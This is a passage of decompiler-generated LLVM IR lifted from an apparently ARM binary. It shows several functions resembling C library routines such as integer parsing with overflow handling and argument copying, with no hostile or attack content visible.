  uselistorder i32 %v0_1310c, { 1, 0 }
  uselistorder i32 %v2_130f4, { 0, 3, 2, 1 }
  uselistorder i32 %v3_13090, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 0, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_13144, { 1, 0 }
  uselistorder label %dec_label_pc_13130, { 1, 0 }
  uselistorder label %dec_label_pc_13100, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_1314c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1314c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_1314c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1314c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1314c
  %v1_1314c = load i32, i32* @r0, align 4
  %v2_1314c = load i32, i32* @r7, align 4
  %v5_1314c = udiv i32 %v2_1314c, 8
  %v6_1314c = and i32 %v5_1314c, %v1_1314c
  store i32 %v6_1314c, i32* @r4, align 4
  %v2_13150 = load i32, i32* @sp, align 4
  %v8_13150 = shl i32 %v2_13150, %arg4
  %v9_13150 = and i32 %v8_13150, %tmp
  call void @__pseudo_branch(i32 %v9_13150)
  %v0_13154.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13154.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v1_13154 = load i32, i32* @r0, align 4
  %v2_13154 = load i32, i32* @r4, align 4
  %v3_13154 = load i32, i32* @fp, align 4
  %v8_13154 = shl i32 %v2_13154, %v3_13154
  %v9_13154 = and i32 %v8_13154, %v1_13154
  store i32 %v9_13154, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1314c, %.thread, %bb
  %v3_1315c = load i32, i32* @r4, align 4
  store i32 %v3_1315c, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp31 = icmp ult i32 %arg3, 128
  br i1 %tmp31, label %dec_label_pc_1317c, label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %.thread1
  %v2_1316c = icmp ugt i32 %arg3, 254
  %v7_1316c = icmp eq i32 %arg3, 255
  %v2_13170 = xor i1 %v7_1316c, true
  %v3_13170 = and i1 %v2_1316c, %v2_13170
  br i1 %v3_13170, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_1316c
  store i32 4, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1316c, %bb22
  %v1_131a49 = phi i32 [ %v3_1315c, %dec_label_pc_1316c ], [ 4, %bb22 ]
  %v2_13174 = xor i1 %v2_1316c, true
  %v3_13174 = or i1 %v7_1316c, %v2_13174
  br i1 %v3_13174, label %bb24, label %bb28

bb24:                                             ; preds = %bb23
  store i32 3, i32* @r4, align 4
  br label %bb28

dec_label_pc_1317c:                               ; preds = %.thread1
  %tmp32 = icmp ugt i32 %arg3, 31
  br i1 %tmp32, label %dec_label_pc_13194, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %dec_label_pc_1317c
  %tmp33 = icmp ugt i32 %arg3, 7
  br i1 %tmp33, label %.thread12, label %dec_label_pc_13200

.thread12:                                        ; preds = %dec_label_pc_13184
  store i32 0, i32* @r4, align 4
  br label %bb28

dec_label_pc_13194:                               ; preds = %dec_label_pc_1317c
  %v2_13194 = icmp ugt i32 %arg3, 62
  %v7_13194 = icmp eq i32 %arg3, 63
  %v2_13198 = xor i1 %v7_13194, true
  %v3_13198 = and i1 %v2_13194, %v2_13198
  br i1 %v3_13198, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_13194
  store i32 2, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_13194, %bb25
  %v1_131a48 = phi i32 [ %v3_1315c, %dec_label_pc_13194 ], [ 2, %bb25 ]
  %v2_1319c = xor i1 %v2_13194, true
  %v3_1319c = or i1 %v7_13194, %v2_1319c
  br i1 %v3_1319c, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  store i32 1, i32* @r4, align 4
  br label %bb28

bb28:                                             ; preds = %.thread12, %bb24, %bb23, %bb26, %bb27
  %v1_131ac = phi i32 [ 3, %bb24 ], [ %v1_131a49, %bb23 ], [ %v1_131a48, %bb26 ], [ 1, %bb27 ], [ 0, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_18164.344 to i32), i32* %r2.global-to-local, align 4
  %v4_131a4 = mul i32 %v1_131ac, 4
  %v5_131a4 = add i32 %v4_131a4, ptrtoint (i32* @global_var_18164.344 to i32)
  store i32 %v5_131a4, i32* %r3.global-to-local, align 4
  %v1_131a8 = add i32 %v4_131a4, add (i32 ptrtoint (i32* @global_var_18164.344 to i32), i32 20)
  %v2_131a8 = inttoptr i32 %v1_131a8 to i32*
  %v3_131a8 = load i32, i32* %v2_131a8, align 4
  store i32 %v3_131a8, i32* %r1.global-to-local, align 4
  %v6_131ac = inttoptr i32 %v5_131a4 to i32*
  %v7_131ac = load i32, i32* %v6_131ac, align 4
  store i32 %v7_131ac, i32* %r2.global-to-local, align 4
  %v1_131b0 = add i32 %tmp, 4
  store i32 %v1_131b0, i32* @r6, align 4
  %v4_131b4 = mul i32 %v3_131a8, 4
  %v5_131b4 = add i32 %v4_131b4, %v1_131b0
  store i32 %v5_131b4, i32* %r3.global-to-local, align 4
  %v2_131b8 = add i32 %arg4, 24
  %v3_131b8 = inttoptr i32 %v2_131b8 to i32*
  store i32 %v5_131b4, i32* %v3_131b8, align 4
  %v0_131bc = load i32, i32* %r2.global-to-local, align 4
  %v1_131bc = load i32, i32* @r5, align 4
  %v2_131bc = add i32 %v1_131bc, 20
  %v3_131bc = inttoptr i32 %v2_131bc to i32*
  store i32 %v0_131bc, i32* %v3_131bc, align 4
  %v0_131c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_131c0 = load i32, i32* @r5, align 4
  %v2_131c0 = add i32 %v1_131c0, 16
  %v3_131c0 = inttoptr i32 %v2_131c0 to i32*
  store i32 %v0_131c0, i32* %v3_131c0, align 4
  %v0_131c4 = load i32, i32* @r4, align 4
  %v1_131c4 = load i32, i32* @r5, align 4
  %v2_131c4 = add i32 %v1_131c4, 12
  %v3_131c4 = inttoptr i32 %v2_131c4 to i32*
  store i32 %v0_131c4, i32* %v3_131c4, align 4
  %v0_131c8 = load i32, i32* @r6, align 4
  %v1_131c8 = load i32, i32* @r5, align 4
  %v2_131c8 = add i32 %v1_131c8, 8
  %v3_131c8 = inttoptr i32 %v2_131c8 to i32*
  store i32 %v0_131c8, i32* %v3_131c8, align 4
  %v0_131cc = load i32, i32* @r5, align 4
  store i32 %v0_131cc, i32* %r1.global-to-local, align 4
  %v0_131d0 = load i32, i32* @r0, align 4
  %v2_131d0 = inttoptr i32 %v0_131d0 to i32*
  %v3_131d0 = call i32 @function_1308c(i32* %v2_131d0, i32 %v0_131cc)
  store i32 %v3_131d0, i32* %r0.global-to-local, align 4
  %v0_131d4 = load i32, i32* @r4, align 4
  %v2_131d4 = icmp eq i32 %v0_131d4, 0
  br i1 %v2_131d4, label %bb29, label %.thread6

bb29:                                             ; preds = %bb28
  %v1_131f014 = load i32, i32* @r7, align 4
  %v2_131f015 = inttoptr i32 %v1_131f014 to i32*
  store i32 0, i32* %v2_131f015, align 4
  %v1_131f4 = load i32, i32* @r4, align 4
  store i32 %v1_131f4, i32* %r0.global-to-local, align 4
  br label %bb30

.thread6:                                         ; preds = %bb28
  %v1_131d8 = load i32, i32* @r5, align 4
  %v2_131d8 = add i32 %v1_131d8, 4
  %v3_131d8 = inttoptr i32 %v2_131d8 to i32*
  %v4_131d8 = load i32, i32* %v3_131d8, align 4
  %v1_131dc = load i32, i32* @r6, align 4
  %v3_131dc = sub i32 %v4_131d8, %v1_131dc
  %v4_131e0 = sdiv i32 %v3_131dc, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_131e8 = mul i32 %v4_131e0, 5
  %v5_131e8 = add i32 %v4_131e8, %v0_131d4
  store i32 %v5_131e8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_131f0 = load i32, i32* @r7, align 4
  %v2_131f0 = inttoptr i32 %v1_131f0 to i32*
  store i32 0, i32* %v2_131f0, align 4
  %v1_131f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_131f8 = load i32, i32* @r7, align 4
  %v3_131f8 = inttoptr i32 %v2_131f8 to i32*
  store i32 %v1_131f8, i32* %v3_131f8, align 4
  %v17_131fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %bb29, %.thread6
  %v17_131fc = phi i32 [ %v1_131f4, %bb29 ], [ %v17_131fc.pre, %.thread6 ]
  %v2_131fc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_131fc, i32* %r4.global-to-local, align 4
  ret i32 %v17_131fc

dec_label_pc_13200:                               ; preds = %dec_label_pc_13184
  %v0_13200 = call i32 @function_10a18()
  store i32 %v0_13200, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_13208 = inttoptr i32 %v0_13200 to i32*
  store i32 22, i32* %v2_13208, align 4
  %v0_1320c = call i32 @function_10a18()
  %v0_13210 = load i32, i32* %r4.global-to-local, align 4
  %v2_13210 = inttoptr i32 %v0_1320c to i32*
  store i32 %v0_13210, i32* %v2_13210, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13218 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13218, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_13194, { 1, 0 }
  uselistorder i1 %v7_1316c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32* @fp, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 13, 14 }
  uselistorder i32 %arg3, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 4, 3, 0, 1, 2 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread1, { 2, 1, 0 }
}

define i32 @function_13220(i8* %arg1) local_unnamed_addr {
dec_label_pc_13220:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_13234 = load i32, i32* @r4, align 4
  store i32 %v3_13234, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_13258.pre = load i32, i32* @global_var_20278, align 4
  br label %dec_label_pc_13250

dec_label_pc_13250:                               ; preds = %dec_label_pc_13250, %dec_label_pc_13220
  %v0_13288 = phi i32 [ %tmp, %dec_label_pc_13220 ], [ %v1_1324c, %dec_label_pc_13250 ]
  store i32 %v0_13288, i32* %r4.global-to-local, align 4
  %v1_13254 = inttoptr i32 %v0_13288 to i8*
  %v2_13254 = load i8, i8* %v1_13254, align 1
  %v3_13254 = zext i8 %v2_13254 to i32
  %v3_1325c = mul nuw nsw i32 %v3_13254, 2
  %v4_1325c = add i32 %v3_1325c, %v2_13258.pre
  %v5_1325c = inttoptr i32 %v4_1325c to i8*
  %v6_1325c = load i8, i8* %v5_1325c, align 1
  %v1_13260 = and i8 %v6_1325c, 32
  %v2_13260 = icmp eq i8 %v1_13260, 0
  %v1_1324c = add i32 %v0_13288, 1
  br i1 %v2_13260, label %dec_label_pc_13268, label %dec_label_pc_13250

dec_label_pc_13268:                               ; preds = %dec_label_pc_13250
  %v7_13268 = icmp eq i8 %v2_13254, 43
  br i1 %v7_13268, label %dec_label_pc_13288, label %dec_label_pc_13270

dec_label_pc_13270:                               ; preds = %dec_label_pc_13268
  %v7_13270 = icmp eq i8 %v2_13254, 45
  br i1 %v7_13270, label %dec_label_pc_13288, label %bb

bb:                                               ; preds = %dec_label_pc_13270
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_132e4

dec_label_pc_13288:                               ; preds = %dec_label_pc_13268, %dec_label_pc_13270
  %storemerge30 = phi i32 [ 1, %dec_label_pc_13270 ], [ 0, %dec_label_pc_13268 ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_1324c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_132e4

dec_label_pc_132e4:                               ; preds = %bb, %dec_label_pc_13288
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_132ec = call i32 @function_10328(i32 -1, i32 10)
  %v0_132f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132f0, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_132fc = urem i32 %v2_132ec, 256
  store i32 %v1_132fc, i32* %sl.global-to-local, align 4
  %v0_13300 = call i32 @function_10218()
  store i32 0, i32* @ip, align 4
  store i32 %v0_13300, i32* %r8.global-to-local, align 4
  %v0_13314.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13314

dec_label_pc_13310:                               ; preds = %bb48, %dec_label_pc_13370
  %v0_13310 = phi i32 [ %v1_13340, %bb48 ], [ %v0_13310.pre, %dec_label_pc_13370 ]
  store i32 %v0_13310, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13314

dec_label_pc_13314:                               ; preds = %dec_label_pc_132e4, %dec_label_pc_13310
  %v0_13340 = phi i32 [ %v0_13314.pre, %dec_label_pc_132e4 ], [ %v0_13310, %dec_label_pc_13310 ]
  %v1_13314 = inttoptr i32 %v0_13340 to i8*
  %v2_13314 = load i8, i8* %v1_13314, align 1
  %v3_13314 = zext i8 %v2_13314 to i32
  %v1_13318 = add nsw i32 %v3_13314, -48
  %v1_1331c = urem i32 %v1_13318, 256
  %v1_13324 = or i32 %v3_13314, 32
  %tmp56 = icmp ult i32 %v1_1331c, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_1332c

dec_label_pc_1332c:                               ; preds = %dec_label_pc_13314
  %tmp57 = icmp ugt i32 %v1_13324, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_1332c
  %v1_13330 = add nsw i32 %v1_13324, -87
  %v5_13338 = urem i32 %v1_13330, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_13314, %dec_label_pc_1332c, %bb42
  %v3_13368 = phi i32 [ %v1_1331c, %dec_label_pc_13314 ], [ 40, %dec_label_pc_1332c ], [ %v5_13338, %bb42 ]
  %v1_1333c = load i32, i32* %r5.global-to-local, align 4
  %v1_13340 = add i32 %v0_13340, 1
  store i32 %v1_13340, i32* %r4.global-to-local, align 4
  %v6_13344 = icmp slt i32 %v3_13368, %v1_1333c
  br i1 %v6_13344, label %dec_label_pc_13348, label %dec_label_pc_13388

dec_label_pc_13348:                               ; preds = %bb43
  %v0_13348 = load i32, i32* @ip, align 4
  %v1_13348 = load i32, i32* %r8.global-to-local, align 4
  %v9_13348 = icmp eq i32 %v0_13348, %v1_13348
  br i1 %v9_13348, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_13348
  br label %dec_label_pc_13358

bb44:                                             ; preds = %dec_label_pc_13348
  %v3_13348 = icmp ult i32 %v0_13348, %v1_13348
  br i1 %v3_13348, label %dec_label_pc_13358, label %dec_label_pc_13370

dec_label_pc_13358:                               ; preds = %bb44, %.thread
  %v4_133601727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_13358 = load i32, i32* %sl.global-to-local, align 4
  %v3_13358 = icmp uge i32 %v3_13368, %v1_13358
  %v9_13358 = icmp eq i32 %v3_13368, %v1_13358
  %v2_1335c = xor i1 %v3_13358, true
  %v3_1335c = or i1 %v9_13358, %v2_1335c
  br i1 %v3_1335c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_13358
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_13358, %bb45
  %v4_13360 = phi i32 [ %v4_133601727, %dec_label_pc_13358 ], [ 0, %bb45 ]
  %v2_13360 = xor i1 %v9_13358, true
  %v3_13360 = and i1 %v3_13358, %v2_13360
  br i1 %v3_13360, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_13360 = urem i32 %v4_13360, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_13364 = phi i32 [ %v5_13360, %bb47 ], [ %v4_13360, %bb46 ]
  %v2_13364 = icmp eq i32 %v0_13364, 0
  br i1 %v2_13364, label %bb48, label %dec_label_pc_13370

bb48:                                             ; preds = %thread-pre-split
  %v4_13368 = mul i32 %v0_13348, %v1_1333c
  %v5_13368 = add i32 %v4_13368, %v3_13368
  store i32 %v5_13368, i32* @ip, align 4
  br label %dec_label_pc_13310

dec_label_pc_13370:                               ; preds = %bb44, %thread-pre-split
  %v0_13370 = call i32 @function_10a18()
  %v0_13374 = load i32, i32* %r7.global-to-local, align 4
  %v1_13374 = load i32, i32* %fp.global-to-local, align 4
  %v2_13374 = and i32 %v1_13374, %v0_13374
  store i32 %v2_13374, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_13380 = inttoptr i32 %v0_13370 to i32*
  store i32 34, i32* %v2_13380, align 4
  %v0_13310.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13310

dec_label_pc_13388:                               ; preds = %bb43
  %v0_13388.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_13388 = icmp eq i32 %v0_13388.pre, 0
  br i1 %v2_13388, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_13388
  %v1_1338c = load i32, i32* %r6.global-to-local, align 4
  %v3_1338c = inttoptr i32 %v0_13388.pre to i32*
  store i32 %v1_1338c, i32* %v3_1338c, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_13388, %bb49
  %v0_13390 = load i32, i32* %r7.global-to-local, align 4
  %v2_13390 = icmp eq i32 %v0_13390, 0
  %. = select i1 %v2_13390, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_1339c = load i32, i32* %fp.global-to-local, align 4
  %v2_1339c = icmp eq i32 %v0_1339c, 0
  %v0_133c0.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_1339c, label %dec_label_pc_133b8, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_133c0.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_133a8, label %dec_label_pc_133b8

dec_label_pc_133a8:                               ; preds = %bb53
  %v0_133a8 = call i32 @function_10a18()
  %v2_133b0 = inttoptr i32 %v0_133a8 to i32*
  store i32 34, i32* %v2_133b0, align 4
  %v0_133b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_133b4, i32* @ip, align 4
  %v0_133b8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %bb53, %bb50, %dec_label_pc_133a8
  %v0_133c0.pre = phi i32 [ %v0_133c0.pre.pre, %bb53 ], [ %v0_133b4, %dec_label_pc_133a8 ], [ %v0_133c0.pre.pre, %bb50 ]
  %v0_133b8 = phi i32 [ %v0_13390, %bb53 ], [ %v0_133b8.pre, %dec_label_pc_133a8 ], [ %v0_13390, %bb50 ]
  %v2_133b8 = icmp eq i32 %v0_133b8, 0
  br i1 %v2_133b8, label %dec_label_pc_133b8._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_133b8
  %v2_133bc = sub i32 0, %v0_133c0.pre
  store i32 %v2_133bc, i32* @ip, align 4
  br label %dec_label_pc_133b8._crit_edge

dec_label_pc_133b8._crit_edge:                    ; preds = %dec_label_pc_133b8, %bb54
  %v0_133c0 = phi i32 [ %v2_133bc, %bb54 ], [ %v0_133c0.pre, %dec_label_pc_133b8 ]
  %v2_133c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_133c4, i32* @r4, align 4
  ret i32 %v0_133c0

; uselistorder directives
  uselistorder i32 %v0_133c0.pre, { 1, 0 }
  uselistorder i32 %v0_133c0.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_13388.pre, { 1, 0 }
  uselistorder i32 %v4_13360, { 1, 0 }
  uselistorder i1 %v3_13358, { 1, 0 }
  uselistorder i32 %v1_13358, { 1, 0 }
  uselistorder i32 %v1_13340, { 1, 0 }
  uselistorder i32 %v1_13324, { 1, 0 }
  uselistorder i32 %v1_1331c, { 1, 0 }
  uselistorder i32 %v0_13310, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 5, 6, 0, 1, 3, 2, 4 }
  uselistorder i32 34, { 1, 2, 4, 0, 3 }
  uselistorder label %dec_label_pc_133b8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_133b8, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_13370, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13314, { 1, 0 }
  uselistorder label %dec_label_pc_13310, { 1, 0 }
  uselistorder label %dec_label_pc_132e4, { 1, 0 }
  uselistorder label %dec_label_pc_13288, { 1, 0 }
}

define i32 @function_133cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_133cc:
  %stack_var_-16 = alloca i32, align 4
  %v2_133cc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_133cc, i32* @r0, align 4
  %v8_133e8 = call i32 @function_13abc(i32 %v2_133cc, i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32 ptrtoint (i32* @global_var_20594.348 to i32), i32 80572, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_133f8 = call i32 @function_13ab4()
  %v2_13400 = load i32, i32* @global_var_26624.352, align 4
  %v2_13404 = icmp eq i32 %v2_13400, 0
  br i1 %v2_13404, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_133cc
  call void @__pseudo_branch(i32 %v2_13400)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_133cc, %bb
  store i32 %v2_133cc, i32* @r0, align 4
  %v9_13424 = call i32 @function_13abc(i32 %v2_133cc, i32 1, i32 ptrtoint (i32* @global_var_20594.348 to i32), i32 80572, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_13424, i32* @r0, align 4
  %v1_13428 = call i32 @function_13a48(i32 %v9_13424)
  store i32 78908, i32* @lr, align 4
  %v2_13438 = call i32 @function_10b94()
  %v0_1343c = load i32, i32* @r4, align 4
  %v1_13440 = call i32 @function_10624(i32 %v0_1343c)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_133cc, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_10624, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_20594.348 to i32), { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_13460(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13460:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_13460 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_13460, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_13470 = ptrtoint i32* %stack_var_-32 to i32
  %v2_13474 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_13474, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13480, %dec_label_pc_13460
  %v0_13494 = phi i32 [ %v1_13494, %dec_label_pc_13480 ], [ 0, %dec_label_pc_13460 ]
  %v3_13480 = phi i32 [ %v1_13488, %dec_label_pc_13480 ], [ %v2_13474, %dec_label_pc_13460 ]
  %v1_13484 = inttoptr i32 %v3_13480 to i32*
  %v2_13484 = load i32, i32* %v1_13484, align 4
  %v1_13488 = add i32 %v3_13480, 4
  %v2_1348c = icmp eq i32 %v2_13484, 0
  store i32 %v1_13488, i32* %stack_var_-32, align 4
  %v1_13494 = add i32 %v0_13494, 1
  store i32 %v1_13494, i32* @lr, align 4
  br i1 %v2_1348c, label %dec_label_pc_1349c, label %dec_label_pc_13480

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13480
  %v3_1349c.neg = mul i32 %v1_13494, -4
  %v1_134a0.neg = add i32 %v2_13470, -8
  %v2_134a4 = add i32 %v1_134a0.neg, %v3_1349c.neg
  %v2_134ac = inttoptr i32 %v2_134a4 to i32*
  store i32 %arg1, i32* %v2_134ac, align 4
  store i32 %v2_13474, i32* %stack_var_-32, align 4
  %v0_134b8 = load i32, i32* @sp, align 4
  store i32 %v0_134b8, i32* @r1, align 4
  store i32 %v0_134b8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_134c0

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134c0.dec_label_pc_134c0_crit_edge, %dec_label_pc_1349c
  %v1_134d4 = phi i32 [ %v5_134d4, %dec_label_pc_134c0.dec_label_pc_134c0_crit_edge ], [ %v0_134b8, %dec_label_pc_1349c ]
  %v3_134c0 = phi i32 [ %v3_134c0.pre, %dec_label_pc_134c0.dec_label_pc_134c0_crit_edge ], [ %v2_13474, %dec_label_pc_1349c ]
  %v1_134c4 = inttoptr i32 %v3_134c0 to i32*
  %v2_134c4 = load i32, i32* %v1_134c4, align 4
  %v0_134c8 = load i32, i32* @lr, align 4
  %v1_134c8 = add i32 %v0_134c8, -1
  store i32 %v1_134c8, i32* @lr, align 4
  %v7_134c8 = icmp eq i32 %v0_134c8, 1
  %v1_134cc = add i32 %v3_134c0, 4
  store i32 %v1_134cc, i32* %stack_var_-32, align 4
  %v2_134d4 = add i32 %v1_134d4, 4
  %v3_134d4 = inttoptr i32 %v2_134d4 to i32*
  store i32 %v2_134c4, i32* %v3_134d4, align 4
  %v4_134d4 = load i32, i32* %ip.global-to-local, align 4
  %v5_134d4 = add i32 %v4_134d4, 4
  store i32 %v5_134d4, i32* %ip.global-to-local, align 4
  br i1 %v7_134c8, label %dec_label_pc_134dc, label %dec_label_pc_134c0.dec_label_pc_134c0_crit_edge

dec_label_pc_134c0.dec_label_pc_134c0_crit_edge:  ; preds = %dec_label_pc_134c0
  %v3_134c0.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_134c0

dec_label_pc_134dc:                               ; preds = %dec_label_pc_134c0
  %v2_134e0 = load i32, i32* @global_var_2662c.357, align 4
  store i32 %v2_134e0, i32* @r2, align 4
  %v0_134e4 = call i32 @function_13f00()
  ret i32 %v0_134e4

; uselistorder directives
  uselistorder i32 %v5_134d4, { 1, 0 }
  uselistorder i32 %v0_134c8, { 1, 0 }
  uselistorder i32 %v1_13494, { 0, 2, 1 }
  uselistorder i32 %v1_13488, { 1, 0 }
  uselistorder i32 %v3_13480, { 1, 0 }
  uselistorder i32 %v2_13474, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_134f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_134f4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
